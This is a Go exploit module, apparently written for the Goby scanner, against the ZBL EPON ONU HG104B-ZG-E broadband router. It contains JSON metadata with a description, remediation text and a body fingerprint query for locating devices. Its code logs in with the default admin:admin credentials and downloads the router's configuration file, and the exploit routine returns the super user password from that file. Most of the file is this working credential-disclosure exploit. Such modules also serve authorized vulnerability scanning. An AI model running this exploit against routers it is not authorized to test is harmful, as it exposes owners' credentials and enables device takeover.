package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ZBL EPON ONU Broadband Router 1.0 Remote Privilege Escalation",
    "Description": "The limited administrative user admin:admin can elevate her privileges by sending a HTTP GET request to the configuration backup endpoint or the password page and disclose the http super user password. Once authenticated as super, an attacker will be granted access to additional and privileged functionalities.",
    "Impact": "ZBL EPON ONU Broadband Router 1.0 Remote Privilege Escalation",
    "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zblchina.com/\">http://www.zblchina.com/</a> </p><p/><p>1. Set access policies through firewalls and other security devices, and set whitelist access. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "HG104B-ZG-E",
    "VulType": [
        "Unauthorized Access"
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "Translation": {
        "CN": {
            "Name": "ZBL EPON ONU 宽带路由器 1.0 权限提升漏洞",
            "Description": "<p>ZBL5932A/ZBL5932C是一款EPON终端产品，应用于FTTH，支持高速数据、视频、语音和CATV业务接入。</p><p>ZBL EPON ONU 宽带路由器 1.0 版本存在权限提升漏洞。管理用户（admin:admin）可以通过向配置备份端点或密码页发送HTTP GET请求来提升其权限。</p>",
            "Impact": "<p>ZBL EPON ONU 宽带路由器 1.0 版本存在权限提升漏洞。管理用户（admin:admin）可以通过向配置备份端点或密码页发送HTTP GET请求来提升其权限。<br></p>",
            "Recommendation": "<p>官方暂未修复该漏洞,请用户联系厂商修复漏洞：<a href=\"http://www.zblchina.com/\">http://www.zblchina.com/</a><br></p><p><br></p><p>1、通过防火墙等安全设备设置访问策略,设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "HG104B-ZG-E.",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "ZBL EPON ONU Broadband Router 1.0 Remote Privilege Escalation",
            "Description": "The limited administrative user admin:admin can elevate her privileges by sending a HTTP GET request to the configuration backup endpoint or the password page and disclose the http super user password. Once authenticated as super, an attacker will be granted access to additional and privileged functionalities.",
            "Impact": "ZBL EPON ONU Broadband Router 1.0 Remote Privilege Escalation",
            "Recommendation": "<p>The official has not fixed this vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"http://www.zblchina.com/\">http://www.zblchina.com/</a> <br></p><p><br></p><p>1. Set access policies through firewalls and other security devices, and set whitelist access. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Product": "HG104B-ZG-E",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "FofaQuery": "body=\"HG104B-ZG-E\"",
    "GobyQuery": "body=\"HG104B-ZG-E\"",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.zblchina.com",
    "DisclosureDate": "2021-03-21",
    "References": [
        "https://www.zeroscience.mk/codes/zbl_router_privs.txt"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": [
            "HG104B-ZG-E"
        ]
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri_1 := "/goform/command"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = true
			cfg_1.Data = `CMD=LOGIN&uname=admin&pws=admin`
			if resp_1, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					uri_2 := "/HG104B-ZG-E.config"
					cfg_2 := httpclient.NewPostRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.Data = `CMD=CONFIG&GO=index.asp&TYPE=CONFIG&files=`
					if resp_2, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
						return resp_2.StatusCode == 200 && strings.Contains(resp_2.Utf8Html, "user_web_password")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri_1 := "/goform/command"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = true
			cfg_1.Data = `CMD=LOGIN&uname=admin&pws=admin`
			if resp_1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 {
					uri_2 := "/HG104B-ZG-E.config"
					cfg_2 := httpclient.NewPostRequestConfig(uri_2)
					cfg_2.VerifyTls = false
					cfg_2.Data = `CMD=CONFIG&GO=index.asp&TYPE=CONFIG&files=`
					if resp_2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
						if resp_2.StatusCode == 200 {
							expResult.Output = resp_2.Utf8Html
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
